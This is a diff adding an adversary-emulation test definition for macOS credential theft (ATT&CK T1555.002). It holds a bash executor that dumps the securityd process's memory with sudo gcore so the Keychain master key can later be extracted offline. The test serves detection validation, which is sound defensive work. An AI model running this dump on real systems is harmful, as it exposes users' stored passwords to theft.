@@ -1,0 +1,36 @@
+attack_technique: T1555.002
+display_name: 'Credentials from Password Stores: Securityd Memory'
+atomic_tests:
+- name: Dump securityd Process Memory
+  auto_generated_guid: 490fcc00-b97d-4368-82ab-fc3017748d57
+  description: |
+    A privileged adversary may scan the memory of the `securityd` process (or its modern equivalents)
+    in search of the decrypted Keychain master key, from which plaintext passwords can be recovered
+    with tooling such as Chainbreaker. This test dumps the target process's memory to disk with `gcore`
+    as the preparatory step for that offline extraction.
+
+    NOTE: requires root, and is blocked outright on modern macOS by System Integrity Protection (SIP)
+    unless SIP is disabled; the attempted `ptrace`/core-dump of a security-sensitive daemon is itself
+    the behavior detections should be validated against.
+
+    Reference: https://www.slideshare.net/slideshow/external-to-da-the-os-x-way/62021418
+  supported_platforms:
+  - macos
+  input_arguments:
+    target_process:
+      description: Name of the process to dump (securityd on older macOS releases).
+      type: string
+      default: securityd
+    dump_path:
+      description: Path prefix to write the process memory dump to.
+      type: path
+      default: /tmp/T1555.002_securityd
+  executor:
+    command: |
+      PID=$(pgrep -x #{target_process})
+      sudo gcore -o #{dump_path} $PID
+      ls -la #{dump_path}*
+    cleanup_command: |
+      rm -f #{dump_path}*
+    name: bash
+    elevation_required: true
